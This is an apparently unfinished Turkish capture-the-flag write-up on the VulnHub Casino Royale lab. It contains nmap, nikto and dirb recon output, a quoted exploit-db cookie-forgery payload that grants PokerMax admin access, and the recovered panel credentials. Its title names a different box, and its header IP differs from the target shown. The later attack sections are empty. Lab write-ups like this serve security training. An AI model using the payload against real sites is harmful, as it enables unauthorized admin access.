# UNKNOWNDEVICE64-V1 Kutusunun Çözümü
**Yazar:** Beren Kuday GÖRÜN<br>
**Tarih:** 13.05.2019<br>
**IP:** 192.168.171.136<br>
**Not:** Kutunun indirme adresi 'kutu' isimli klasöre eklenmiştir.<br>
**Flag:** /root/flag.txt'yi oku<br>
**Sayfa:** https://www.vulnhub.com/entry/casino-royale-1,287/

## 1.	Bilgi Toplama
### 1.1	Ip Tespiti:
```sh
root@kali:~# arp-scan -l
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.171.1	00:50:56:c0:00:08	VMware, Inc.
192.168.171.2	00:50:56:ff:0c:9c	VMware, Inc.
192.168.171.141	00:0c:29:b0:59:ea	VMware, Inc.
192.168.171.254	00:50:56:f8:b6:d2	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.5: 256 hosts scanned in 2.833 seconds (90.36 hosts/sec). 4 responded
```
Hedef makinenin IP adresi 192.168.171.141


### 1.2	Servis Tespiti:
```sh
root@kali:~# nmap -p- -A 192.168.171.141
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-13 16:44 EDT
Nmap scan report for 192.168.171.141
Host is up (0.00065s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: casino.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=casino
| Subject Alternative Name: DNS:casino
| Not valid before: 2018-11-17T20:14:11
|_Not valid after:  2028-11-14T20:14:11
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/cards /kboard
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 00:0C:29:B0:59:EA (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.65 ms 192.168.171.141

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.72 seconds
```
ftp, smtp, ve http portlarımız bulundu. İlk olarak http portlarına bakalım ve bir ilerleyiş çizmeye çalışalım. 80. porta baktığımda sadece bir video gördüm ve bunun üzerine nikto ve dirb çalıştırmaya karar verdim.

Nikto çıktısı:
```sh
root@kali:~# nikto -h http://192.168.171.141/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.171.141
+ Target Hostname:    192.168.171.141
+ Target Port:        80
+ Start Time:         2019-05-13 16:57:17 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0xdc 0x58272762faf27 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cards/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/kboard/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Multiple index files found: /index.php, /index.html
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ /kboard/: KBoard Forum 0.3.0 and prior have a security problem in forum_edit_post.php, forum_post.php and forum_reply.php
+ OSVDB-3092: /cards/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /install/: This might be interesting...
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8348 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2019-05-13 16:58:00 (GMT-4) (43 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.25) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? n
```
http://192.168.171.141/cards/ sayfasında kısaca bize denemeye devam dediler. Şuan da /kboard/ altında da bir şey bulamadım. Bunlara hiç bir sonuç bulamazsam tekrar bakmak üzere not aldım ve çıktıda ilerledim. phpmyadmin klasörü bulundu bu bizim için iyi bir bilgi...
install klasörü altında ilginç bir şey buldum. Burada bir web uygulamasının kurulum sayfası var. Eğer bir uygulama varsa, yapımcılar hayal gücümüzü kullanmaktan ziyade genelde bizi exploit arayışına sokmak istediklerini düşünüyorum. Bunuda notlarıma aldım ve dirb taraması ile devam ettim.

```sh
root@kali:~# dirb http://192.168.171.141/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May 13 17:05:00 2019
URL_BASE: http://192.168.171.141/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.171.141/ ----
==> DIRECTORY: http://192.168.171.141/cards/                                                            
+ http://192.168.171.141/cgi-bin/ (CODE:403|SIZE:298)                                                   
==> DIRECTORY: http://192.168.171.141/includes/                                                         
+ http://192.168.171.141/index.html (CODE:200|SIZE:220)                                                 
+ http://192.168.171.141/index.php (CODE:200|SIZE:2796)                                                 
==> DIRECTORY: http://192.168.171.141/install/                                                          
==> DIRECTORY: http://192.168.171.141/javascript/                                                       
==> DIRECTORY: http://192.168.171.141/kboard/                                                           
==> DIRECTORY: http://192.168.171.141/phpmyadmin/                                                       
+ http://192.168.171.141/robots.txt (CODE:200|SIZE:49)                                                  
+ http://192.168.171.141/server-status (CODE:403|SIZE:303)                                              
                                                                                                        
---- Entering directory: http://192.168.171.141/cards/ ----
+ http://192.168.171.141/cards/index.php (CODE:200|SIZE:51)                                             
                                                                                                        
---- Entering directory: http://192.168.171.141/includes/ ----
+ http://192.168.171.141/includes/index.html (CODE:200|SIZE:301)                                        
                                                                                                        
---- Entering directory: http://192.168.171.141/install/ ----
+ http://192.168.171.141/install/index.php (CODE:200|SIZE:2811)                                         
                                                                                                        
---- Entering directory: http://192.168.171.141/javascript/ ----
==> DIRECTORY: http://192.168.171.141/javascript/jquery/                                                
                                                                                                        
---- Entering directory: http://192.168.171.141/kboard/ ----
+ http://192.168.171.141/kboard/index.php (CODE:200|SIZE:46)                                            
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/ ----
==> DIRECTORY: http://192.168.171.141/phpmyadmin/doc/                                                   
+ http://192.168.171.141/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                   
+ http://192.168.171.141/phpmyadmin/index.php (CODE:200|SIZE:10525)                                     
==> DIRECTORY: http://192.168.171.141/phpmyadmin/js/                                                    
==> DIRECTORY: http://192.168.171.141/phpmyadmin/libraries/                                             
==> DIRECTORY: http://192.168.171.141/phpmyadmin/locale/                                                
+ http://192.168.171.141/phpmyadmin/phpinfo.php (CODE:200|SIZE:10527)                                   
==> DIRECTORY: http://192.168.171.141/phpmyadmin/setup/                                                 
==> DIRECTORY: http://192.168.171.141/phpmyadmin/sql/                                                   
==> DIRECTORY: http://192.168.171.141/phpmyadmin/templates/                                             
==> DIRECTORY: http://192.168.171.141/phpmyadmin/themes/                                                
                                                                                                        
---- Entering directory: http://192.168.171.141/javascript/jquery/ ----
+ http://192.168.171.141/javascript/jquery/jquery (CODE:200|SIZE:267180)                                
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/doc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/libraries/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/locale/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/setup/ ----
==> DIRECTORY: http://192.168.171.141/phpmyadmin/setup/frames/                                          
+ http://192.168.171.141/phpmyadmin/setup/index.php (CODE:200|SIZE:927)                                 
==> DIRECTORY: http://192.168.171.141/phpmyadmin/setup/lib/                                             
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/sql/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/setup/frames/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://192.168.171.141/phpmyadmin/setup/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon May 13 17:05:52 2019
DOWNLOADED: 41508 - FOUND: 14
```

dirb çıktısında index.html ile index.php dosyaları bulundu ve iki dosyanında boyutları farklı. index.php sayfasına gidildiğinde /install/ klasörü altında gördüğümüz uygulamanın kurulmuş olduğunu gördüm.
Sayfanın en altında `Created with PokerMax Poker League Software` ifadesini gördüm. Bununla alakalı internette biraz araştırma yaptıktan sonra `https://www.exploit-db.com/exploits/6766` sayfasında bir not buldum. Şimdi bu notu aşağıda paylaşıyorum.
```
**************************************************************************************

Author : DaRkLiFe
Greetz : str0ke & S.W.A.T. & funkys0ul

**************************************************************************************
Script   :

PokerMax Poker League Insecure Cookie Handling Vulnerability

Download:

http://www.stevedawson.com/downloads/pokerleague.zip
**************************************************************************************

Exploit :

javascript:document.cookie = "ValidUserAdmin=admin";

**here "admin" refers to username of administrator on site

default username is "admin" given after installation of site

but if it is changed u can easily find out username of admin and then 
substitute it in place of "admin"
**************************************************************************************

Instructions :

Find the site running on this script .

Go to http://site.com/pokerleague/pokeradmin/configure.php

It will ask for login. Now in url tab run the exploit command

Then return back to http://site.com/pokerleague/pokeradmin/configure.php

Now u should be loggedin as admin and change the thing into what you want .

**************************************************************************************

THANKS ! GREETZ ! HAPPY DIWALI !
**************************************************************************************

# milw0rm.com [2008-10-16]
```
Yukarıdaki açıklamada `document.cookie = "ValidUserAdmin=admin";` payloadını tarayıcı üzerinden javascript consolundan girdikten sonra `/pokerleague/pokeradmin/configure.php` sayfasına gitmemizi istiyor. Ancak 404 aldım. Bu açıklamada uygulanın `/pokerleague/` altında kurulduğu varsayılmış gibi. Ancak `index.php` sayfasına gidildiğinde uygulamayı görmüştük. Bunun üzerine `/pokeradmin/configure.php` sayfasını denedim ve bingo!
Kullanıcı adı: `admin`
Şifre: `raise12million`

<div align="center">
    <img src="dosyalar/js-payload.PNG" style="width:100%;">
    <p>Javascript payloadımızı ekliyoruz.</p>
</div>

<div align="center">
    <img src="dosyalar/404.PNG" style="width:100%;">
    <p>Upss</p>
</div>

<div align="center">
    <img src="dosyalar/bingo.PNG" style="width:100%;">
    <p>Bingo</p>
</div>



Panelde gezindikten sonra `Manage Players` linki altında oyuncu listeleri buldum ve `Valenka` isimli kullanıcı altında `/vip-client-portfolios/?uri=blog` bir link buldum. Bu adrese gidince bazı işler ters gitti. Bunun sebebi aşağıdaki fotoğrafrada olduğu gibi DNS.

<div align="center">
    <img src="dosyalar/dns.PNG" style="width:100%;">
</div>

```sh
root@kali:~# nano /etc/hosts
```
```sh
127.0.0.1       localhost
127.0.1.1       kali
192.168.171.141 casino-royale.local
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
DNS kaydını ekledikten sonra sayfayı tekrar yeniledim. Yine bir web uygulaması varmış gibi duruyor:`Snowfox CMS`

<div align="center">
    <img src="dosyalar/dns_ok.PNG" style="width:100%;">
</div>


## 2	Zayıflık Tarama


## 3	Sisteme Sızma


## 4	Yetki Yükseltme


### Kaynaklar:### 
